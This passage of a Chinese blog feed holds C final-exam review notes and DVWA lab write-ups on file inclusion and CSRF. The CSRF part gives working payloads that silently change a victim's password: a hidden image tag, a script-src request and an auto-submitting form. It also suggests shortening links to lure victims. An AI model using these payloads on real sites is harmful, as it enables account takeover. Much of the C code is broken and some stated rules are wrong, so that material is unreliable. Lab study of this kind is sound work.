class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">multiply</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">divide</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>(<span class="type">float</span>)a/b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> expr[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> mun1,num2;</span><br><span class="line"><span class="type">char</span> op;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入表达式&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,expr);</span><br><span class="line"><span class="built_in">scanf</span>(expr<span class="string">&quot;%d %c %d&quot;</span>,&amp;num1,&amp;op,&amp;num2);</span><br><span class="line"><span class="keyword">switch</span>(op)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d+%d=%d\n&quot;</span>,num1,num2,add(num1,num2));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d-d=%d\n&quot;</span>,num1,num2,subtract(num1,num2));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d*%d=%d\n&quot;</span>num1,num2, multiply(num1,num2));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d/%d=%.2f\n&quot;</span>,num1,num2,divide(num1,num2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;非法运算符\n);</span></span><br><span class="line"><span class="string">break;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="冒泡排序学生总成绩"><a href="#冒泡排序学生总成绩" class="headerlink" title="冒泡排序学生总成绩"></a>冒泡排序学生总成绩</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_N 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="type">char</span> id[<span class="number">10</span>];</span><br><span class="line"><span class="type">float</span> ma,ch,total;</span><br><span class="line">&#125; stu[MAX_N];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> n=<span class="number">4</span>,i,j;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;请输入学生人数n=\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;请输入学生信息:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s %s %f %f&quot;</span>, &amp;stu[i].name,&amp;stu[i].id,&amp;stu[i].ma,&amp;stu[i].ch);</span><br><span class="line">stu[i].total=(stu[i].ma+stu[i].ch)/<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n<span class="number">-1</span>-i;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(stu[j].total&gt;stu[j+<span class="number">1</span>].total)&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">mid</span>;</span></span><br><span class="line">mid=stu[j];</span><br><span class="line">stu[j]=stu[j+<span class="number">1</span>];</span><br><span class="line">stu[j+<span class="number">1</span>]=mid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">printf</span>(<span class="string">&quot;%s %s %.2f\n&quot;</span>, stu[i].name,stu[i].id,stu[i].total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言期末复习1</title>
      <link href="/2023/12/02/dayc1/"/>
      <url>/2023/12/02/dayc1/</url>
      
        <content type="html"><![CDATA[<h1 id="c语言期末复习辅助"><a href="#c语言期末复习辅助" class="headerlink" title="c语言期末复习辅助"></a>c语言期末复习辅助</h1><h2 id="知识点总复习"><a href="#知识点总复习" class="headerlink" title="知识点总复习"></a>知识点总复习</h2><p>1.程序结构是三种，顺序结构，循环结构，选择结构，</p><p>2.读取程序都需要在main()函数入口，然后从上往下读，直到主函数结束。</p><p>3.计算机中的数据是以二进制的形式保存的，存放的位置就是他的地址，地址是十六进制的</p><p>4.运算符的优先级：单目运算符&gt;双目运算符&gt;三目运算符，算术运算符&gt;关系运算符&gt;逻辑运算符&gt;赋值运算符,逗号运算符的级别最低。</p><h2 id="常见基础知识"><a href="#常见基础知识" class="headerlink" title="常见基础知识"></a>常见基础知识</h2><h3 id="普遍"><a href="#普遍" class="headerlink" title="普遍"></a>普遍</h3><p>1.标识符必须有字母数字下划线组成，并且第一个字符必须为字母或者数字。</p><p>2.不能用main define sacnf等作为标识符</p><p>3.c语言的八进制要以0开头，十六进制要以0x开头。</p><p>4.小数的合法写法：1.0可以写成1 0.1可以写成.1</p><p>5.e前e后必须有数，e后必为整数。</p><p>6.long int x 表示x是长类型 unsignde int x 标识x是无符号类型</p><h3 id="表达式："><a href="#表达式：" class="headerlink" title="表达式："></a>表达式：</h3><p>1.算数表达式：</p><p>”&#x2F;“两边都是整形，那么结果就是一个整数（四舍五入）</p><p>”&#x2F;“如果有一边为小数，那么结果就是小数</p><p>”%“注意是取余数，两边的要求是整数。</p><p>2.赋值表达式</p><p>不能连续赋值</p><p>赋值的左边只能是一个表达式</p><p>3.自加表达式</p><p>++在前先加后用，，++在后先用后加（–类似0</p><p>4.逗号表达式</p><p>优先级别最低</p><p>5.三种取整丢小数的情况</p><p>int a&#x3D;1.6;</p><p>(int)a;</p><p>1&#x2F;2;3&#x2F;2</p><p>6.定义宏常量：#define 标识符 字符串加分号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define PI 3.14159</span><br><span class="line">定义pi</span><br></pre></td></tr></table></figure><p>定义const常量： const 数据类型 标识符字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const int MAX_VALUE = 100;</span><br><span class="line">在这个例子中，MAX_VALUE就是一个const常量，它的数据类型为int，值为100。在程序中可以直接使用MAX_VALUE来代表这个值，而不需要担心其被修改。</span><br></pre></td></tr></table></figure><h3 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h3><h4 id="重要：大写字母和小写字母转换的方法"><a href="#重要：大写字母和小写字母转换的方法" class="headerlink" title="重要：大写字母和小写字母转换的方法"></a>重要：大写字母和小写字母转换的方法</h4><p>‘A’+32&#x3D;’a’ 相互之间一般差32</p><p>转移字符（重要）</p><p>\n换行</p><p>\0空字符</p><p>注：字符型（char)和整数(int)是近亲:有着相似的地方</p><p>char a&#x3D;65</p><p>printf(“%c”,a);得到a</p><p>printf(“%d”,A);得到65</p><h4 id="键盘输入和屏幕输出："><a href="#键盘输入和屏幕输出：" class="headerlink" title="键盘输入和屏幕输出："></a>键盘输入和屏幕输出：</h4><p>getchar()用于字符输入</p><p>putchar（）用于字符输出</p><p>printf（）用于输出数据</p><p>scanf()用于输入数据</p><h3 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h3><p>1.if（）语句后面不加分号</p><p>2.单支if() 双支if else  多分支if if else() else</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ()&#123;</span><br><span class="line">......;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.switch语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch()&#123;</span><br><span class="line">case 1:.....;</span><br><span class="line">break</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般需要break使其跳出循环，否则将会按照顺序往下继续进行</p><h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><p>1.while</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while()&#123;</span><br><span class="line">......;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>1.计算循环控制表达式的值;<br>2.如果循环表达式的值为真，那么就执行循环体中的语句，并返回while重新开始判断<br>3.如果循环控制表达式的值为假，就退出循环，执行循环体后面的语句。</p><p>2.do-while</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">.....;</span><br><span class="line">&#125;while();</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>1.执行循环体中的语句;<br>2.计算循环控制表达式的值;<br>3.如果循环控制表达式的值为真，那么返回继续执行<br>4.如果循环控制表达式的值为假，就退出循环，执行循环体后面的语句。</p><p>3.for</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(初始化表达式;循环控制表达试;增值表达式)</span><br><span class="line">&#123;</span><br><span class="line">语句序列</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.注意：使用合适的循环结构，①如果循环次数已知，计数控制的循环，用for语句。②如果循环次数未知，条件控制的循环，用while语句③如果循环体至少要执行一次，用do–while语句。</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="定义并初始化数组"><a href="#定义并初始化数组" class="headerlink" title="定义并初始化数组"></a>定义并初始化数组</h4><p>存放五个字符：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char a[5]=&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;&#125;;</span><br></pre></td></tr></table></figure><p>存放一个字符：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char a[5]=&quot;abcd&quot;;</span><br></pre></td></tr></table></figure><p>二维数组初始化：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char a[3][4]=&#123;&quot;abc&quot;,&quot;cv&quot;,&quot;rty&quot;&#125;;</span><br></pre></td></tr></table></figure><h4 id="输入字符串"><a href="#输入字符串" class="headerlink" title="输入字符串"></a>输入字符串</h4><p>1.scanf(“%s”,字符串名称)；</p><p>scanf(“%s%s%s”,s1,s2,s3);</p><p>2.get</p><p>get(字符串名称);</p><p>只能输入一个字符串，从光标开始到换行符，也就是说读入的是一整行。例如输入Hello World！获取的是Hello World!</p><h4 id="输出字符串"><a href="#输出字符串" class="headerlink" title="输出字符串"></a>输出字符串</h4><p>1.printf(“%s”,字符串名称)；</p><p>输出项只能是字符串的名称，不能是数组元素。输出字符串不包括字符串结束标识符\0</p><p>2.put</p><p>puts(字符串名称)；</p><p>puts输出一个字符串和一个换行符</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>函数，函数对形参做处理，结果以return语句形式返回。对函数定义时要加函数类型和实参类型，但函数调用时实参不带类型。</p><h2 id="补充：常见内容的运用"><a href="#补充：常见内容的运用" class="headerlink" title="补充：常见内容的运用"></a>补充：常见内容的运用</h2><h3 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i,j,temp,n,a[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span> (j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span> (a[j]&gt;a[i])&#123;</span><br><span class="line">temp=a[j];</span><br><span class="line">a[j]=a[i];</span><br><span class="line">a[i]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i,j,k,temp;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">k=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span> (a[j]&lt;a[k])&#123;</span><br><span class="line">k=j</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (k!=i)&#123;</span><br><span class="line">temp=a[k];</span><br><span class="line">a[k]=a[i];</span><br><span class="line">a[k]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i,l,temp,a[num];</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;num;i++)&#123;</span><br><span class="line">l=i<span class="number">-1</span>;</span><br><span class="line">temp=a[i];</span><br><span class="line"><span class="keyword">while</span>(l&gt;=<span class="number">0</span>&amp;&amp;a[l]&gt;temp)&#123;</span><br><span class="line">a[l+<span class="number">1</span>]=a[l];</span><br><span class="line">l--;</span><br><span class="line">a[l+<span class="number">1</span>]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">int</span> arr[],<span class="type">int</span> size)</span>&#123;</span><br><span class="line"><span class="type">int</span> i,j,temp;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;size<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;size<span class="number">-1</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j]&gt;arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">tmep=arr[j];</span><br><span class="line">arr[j+<span class="number">1</span>]=arr[j];</span><br><span class="line">arr[j+<span class="number">1</span>]=temp;</span><br><span class="line">count=<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> low,high,a[n],mid,temp;</span><br><span class="line">low=<span class="number">0</span>,high=n<span class="number">-1</span>,mid=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">mid=(low+high)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (a[mid]&gt;temp)&#123;</span><br><span class="line">high=mid<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a[mid]&lt;temp)&#123;</span><br><span class="line">low=mid+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[mid]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;not found!&quot;</span>&lt;&lt;<span class="built_in">endl</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa FI</title>
      <link href="/2023/11/30/day77777/"/>
      <url>/2023/11/30/day77777/</url>
      
        <content type="html"><![CDATA[<h1 id="File-Inclusion-文件包含"><a href="#File-Inclusion-文件包含" class="headerlink" title="File Inclusion 文件包含"></a>File Inclusion 文件包含</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>文件包含漏洞：即File  Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p>]]></content>
      
      
      <categories>
          
          <category> web dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa CSRF</title>
      <link href="/2023/11/28/day666/"/>
      <url>/2023/11/28/day666/</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF（跨站请求伪造），全称为Cross-site request  forgery，简单来说，是攻击者利用受害者尚未失效的身份认证信息，诱骗受害者点击恶意链接或含有攻击代码的页面，在受害者不知情的情况下以受害者的身份像服务器发起请求，从而实现非法攻击（改密）。</p><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">//获取两个输入框的密码</span><br><span class="line">    $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">//查看两次输入的是否一致</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">//如果一致就直接插入数据库</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过GET方式获取两次密码，两次密码输入一致的话，就可以直接带入数据中修改密码。</p><p>攻击方式：</p><p>经过上面的尝试发现可以成功修改账号密码，而且我们发现了URL那里的变化，接下来我们从URL处入手再改一下，首先先重置一下数据库，把密码改回来。</p><p>在 C:\phpstudy_pro\WWW 文件夹中建立一个 1.html ，里面写入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://127.0.0.3/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure><p>这样的话，当我们打开 1.html 文件的时候，密码就会被修改成123456，（诱骗受害者点击这个1.html文件，放个诱惑链接）</p><p>诱骗链接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</span><br></pre></td></tr></table></figure><p>但是一般有一些智商的都不会点击，所以可以将长链接转为短链接，可以使用<a href="https://tool.chinaz.com/tools/dwz.aspx%E6%9D%A5%E7%94%9F%E6%88%90%E7%9F%AD%E9%93%BE%E6%8E%A5%E3%80%82">https://tool.chinaz.com/tools/dwz.aspx来生成短链接。</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>或者配合xss一块使用</p><p>新建一个带有xss攻击的hmtl的页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;XSS&amp;CSRF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&amp;password_conf=222&amp;Change=Change#&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当受害者访问127.0.0.1&#x2F;xss.hmtl的时候，密码就被修改成了222</p><p>hmtl的核心语句就是通过scirpt标签的src属性来记载攻击的url</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&amp;password_conf=222&amp;Change=Change#&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Checks to see where the request came from</span><br><span class="line">//stripos(str1, str2)检查str2在str1中出现的位置（不区分大小写)，如果有返//回True，反之False</span><br><span class="line">//判断Host字段是否出现在referer字段中</span><br><span class="line">    if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123;</span><br><span class="line">        // Get input</span><br><span class="line"></span><br><span class="line">        $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">        $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">        // Do the passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // They do!</span><br><span class="line">            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            // Update the database</span><br><span class="line">            $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Feedback for the user</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Issue with passwords matching</span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Didn&#x27;t come from a trusted source</span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>由上面的代码可知增加了referer判断</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false )</span><br></pre></td></tr></table></figure><p>即如果 HTTP_REFERER 和 SERVER_NAME 不是来自同一个域的话就无法进行到循环内部，执行修改密码的操作。</p><p>所以我们需要手动伪造referer来执行CSRF攻击</p><p>我们要手动制作一个html表单</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;CSRF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;get&quot; id=&quot;csrf&quot; action=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;222&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;222&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>通过自动触发提交id为csrf的表单</p><p>使用方法：</p><p>1.将上述 html 页面放到服务器的 <code>127.0.0.1</code> 目录下，然后让用户访问自动触发提交然后访问构造好的 payload 地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.mengnankk.top/127.0.0.1/csrf.html</span><br></pre></td></tr></table></figure><p>2.或者将上述html文件命名为127.0.0.1html然后访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 